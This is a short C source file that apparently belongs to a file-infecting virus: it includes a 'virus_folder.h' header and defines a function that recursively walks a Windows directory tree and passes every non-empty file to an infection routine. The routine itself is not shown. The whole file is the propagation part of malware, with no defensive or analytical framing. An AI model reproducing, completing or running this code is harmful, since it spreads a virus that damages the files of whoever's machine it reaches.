#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <io.h>

#include "virus_folder.h"

int infec_findfile(char path[],char source[])
{
	char temp[1024]="", temp1[1024]="";
	int result = 1, len;
	struct _finddata_t fd;
	long handel;
	strcpy(temp, path);
	strcpy(temp1, path);

	handel = _findfirst(temp, &fd);
	if (handel == -1)
	{
		printf("There were no files.\n");
		return -1;
	}
	len = strlen(temp);
	temp[len - 3] = '\0';
	while (result != -1)
	{
		if (fd.size != 0)
		{
			sprintf(temp1,"%s%s",temp,fd.name);
			infection(source,temp1);
		}
		else if (!strcmp(fd.name, ".") || !strcmp(fd.name, ".."))
			printf("\n%s%s\n", temp, fd.name);
		else
		{
			sprintf(temp1, "%s%s\\*.*", temp, fd.name);
			if (infec_findfile(temp1,source) == -1)
			{
				len = strlen(temp1);
				temp1[len - 3] = '\0';
			}
		}
		result = _findnext(handel, &fd);
	}
	_findclose(handel);
	return 0;
}